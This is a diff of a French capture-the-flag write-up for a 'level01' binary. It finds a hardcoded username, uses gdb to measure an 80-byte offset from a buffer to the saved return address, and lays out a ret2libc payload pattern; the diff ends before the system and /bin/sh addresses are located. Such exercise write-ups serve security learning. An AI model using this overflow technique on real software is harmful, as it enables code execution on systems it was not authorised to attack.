@@ -3,12 +3,18 @@
 On commence par décompiler le code. On observe différentes choses intéressantes. On remarque que le programme attend 2 entrées. 
 
 ```C
+
+fgets(a_user_name, 0x100, _reloc.stdin);
+fgets(auStack84, 100, _reloc.stdin);
+
 printf("Enter Username: ");
 puts("Enter Password: ");
 ```
 
-Notre programme attend un `username` et un  `password`. 
-La vérification du `username` se fait de par la fonction `verify_user_name` 
+La fonction `fgets` est appelé 2 fois, on devra donc saisir 2 arguments en entrée standart.
+
+Notre programme attend un `username` et un `password`. 
+La vérification du `username` se fait de par la fonction `verify_user_name`.
 
 ```C
 printf("Enter Username: ");
@@ -16,7 +22,7 @@ fgets(a_user_name, 0x100, _reloc.stdin);
 iStack20 = verify_user_name();
 ```
 
-Le code décompilé de cette fonction est assez incompréhensible. On observe une chaine de caractères en dur dans le code.
+Le code décompilé de cette fonction est assez incompréhensible. On observe une chaine de caractères dans le code.
 
 ```C
 pcVar3 = (code *)"dat_wil";
@@ -38,7 +44,7 @@ verifying username....
 
 Enter Password:
 ```
-Notre hypothèse est vérifié, notre programme attend `dat_wil` comme `username`.
+Notre hypothèse est vérifiée, notre programme attend `dat_wil` comme `username`.
 
 Pour le `password`, cela semble plus complexe. En effet, le programme semble r'envoyer dans tout les cas `nope, incorrect password ...\n`.
 
@@ -65,36 +71,80 @@ Le code décompilé de cette fonction n'est pas lisible. On voit seulement une c
 puVar2 = (uint8_t *)"admin";
 ```
 
-En essayant de mettre  `admin` comme `password`, on obtiens toujours le même résultat, à savoir `nope, incorrect password...`
+En essayant de mettre `admin` comme `password`, on obtient toujours le même résultat, à savoir `nope, incorrect password...`
 
-On observe que lorsqu'on saisit le `password`, la fonction `fgets` est appelé.
+La fonction `fgets` nous permet de saisir notre `password`.
+On observe que notre `input` sera stocké dans un `buffer` de 16 et que 100 caractères seront lu.
 
 ```C
 undefined4 auStack84 [16];
 fgets(auStack84, 100, _reloc.stdin);
 ```
-Nous allons donc mettre 100 caractères dans notre `input` `password`, et voir ce qu'il se passe.
+
+Nous allons afficher la `stack` pour voir ce qu'il se passe lorsqu'on saisit un `password`.
 
 ```
 > gdb ./level01
-> (gdb) r
+> (gdb) disass main 
+[...]
+ 	0x08048574 <+164>:	call   0x8048370 <fgets@plt>
+	0x08048579 <+169>:	lea    0x1c(%esp),%eax
+   	0x0804857d <+173>:	mov    %eax,(%esp)
+   	0x08048580 <+176>:	call   0x80484a3 <verify_user_pass>
+[...]
+> (gdb) b *0x08048580
+[...]
+> (gdb) r 
 [...]
 Enter Username: dat_wil
 [...]
-Enter Password: Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
-[...]
-Program received signal SIGSEGV, Segmentation fault.
-0x37634136 in ?? ()
+Enter Password:
+AAAA
+
+Breakpoint 1, 0x08048580 in main ()
+> (gdb) x $esp
+0xffffd680:	0xffffd69c
+> (gdb) x $ebp+0x04
+0xffffd6ec:	0xf7e45513
+> (gdb) x/30wx $esp
+0xffffd680:	0xffffd69c	0x00000064	0xf7fcfac0	0x00000001
+		            ^
+					adresse du buffer
+0xffffd690:	0xffffd8ac	0x0000002f	0xffffd6ec	0x41414141
+												  ^
+												  AAAA
+0xffffd6a0:	0x0000000a	0x00000000	0x00000000	0x00000000
+0xffffd6b0:	0x00000000	0x00000000	0x00000000	0x00000000
+0xffffd6c0:	0x00000000	0x00000000	0x00000000	0x00000000
+0xffffd6d0:	0x00000000	0x00000000	0x00000000	0x00000000
+0xffffd6e0:	0xf7fceff4	0x00000000	0x00000000	0xf7e45513
+												^
+												eip
+0xffffd6f0:	0x00000001	0xffffd784
 ```
-On a [généré](https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/) une chaine de 100 caractères. Notre programme a segault. Nous aimerons donc savoir le décalage entre le début de notre `buffer`et `eip`.
 
- Notre `eip` est 0x37634136. Ici le [décalage](https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/) est de `80`.
-Notre programme n'exécute pas de `shell`. Nous pouvons ici utiliser l'exploit `RetToLibC`. 
+On observe plusieurs choses très intéressantes. Tout d'abord, on a `break` après le `fgets` contenant notre `input` `password`. 
+Nous avons mis `AAAA` afin de les repérer dans la `stack`.
+Nous avons visualisé l'adresse de notre `buffer` : `0xffffd69c` ainsi que celle de `eip` : `0xffffd6ec`. 
+L'adresse du début du `buffer` est située à l'adresse pointée par `esp`. C'est l'argument de la fonction `fgets`.
+L'adresse de `eip` est stockée à `ebp+0x04`.
 
-Nous allons construire notre exploit de cette façon : 
+Pour connaître le nombre de caractère necessaires afin d'atteindre `eip`, nous pouvons effectuer ce calcul :
 
 ```
-[username_valide] + [A * Offset] + [adresse de system] + [DAMN] + [adresse de bin/sh]
+nombre_de_caractères = adresse_eip - adresse_buffer
+                     = 0xffffd6ec - 0xffffd69c
+                     = 0x50
+                     = 80 (base 10)
+```
+
+Il faudra alors mettre 80 caractères pour écraser `eip`. Nous avons vu précédement que la fonction `fgets` lisait 100 caractère. En mettant 80 caractères, nous pourrons donc écraser `eip`.
+
+Notre programme n'exécute pas de `shell`. Nous pouvons écraser `eip`. L'exploit `RetToLibC` semble réalisable.
+Pour ce faire, nous allons construire notre exploit de cette façon : 
+
+```
+[username_valide] + [80 caractères] + [adresse_retour_system] + [DAMN] + [adresse_bin_sh]
 ```
 
 Trouvons maintenant l'adresse  `system` et de `bin/sh`. 
